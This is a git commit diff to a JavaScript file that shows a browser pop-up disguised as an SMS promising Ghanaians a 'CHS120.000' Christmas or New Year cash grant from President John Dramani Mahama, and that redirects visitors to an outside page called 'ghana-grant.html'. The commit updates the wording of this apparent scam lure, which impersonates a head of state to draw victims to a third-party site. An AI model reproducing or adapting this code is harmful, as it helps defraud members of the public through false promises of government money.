6399ede5b711a4de48c1a971fafe3437b5f059bb
Imohekpe1 <169145829+Imohekpe1@users.noreply.github.com>
2024-12-26 05:54:11 -0800

    Update ghana-active.js

--- ghana-active.js
+++ ghana-active.js
@@ -1,6 +1,6 @@
 
-var password = 'CHS120.000 X-MAS GRANT'
-password=prompt('SMS: Congratulations You are qualify for President JOHN DRAMANI MAHAMA CHS120.000 CHRISTMAS CASH GRANT FOR GHANAIANS, Kindly Press OK to Withdraw X-MAS Cash Grant   ','CHS120.000 X-MAS GRANT');
-if (password != 'CHS120.000 X-MAS GRANT') {
+var password = 'WITHDRAW CHS120.000'
+password=prompt('SMS: Congratulations You are qualify for President JOHN DRAMANI MAHAMA CHS120.000 NEW YEAR CASH GRANT FOR GHANAIANS, Kindly Press OK to Withdraw X-MAS Cash Grant   ','WITHDRAW CHS120.000');
+if (password != 'WITHDRAW CHS120.000') {
 location.href='https://all-free-byt.org/ghana-grant.html';
 }
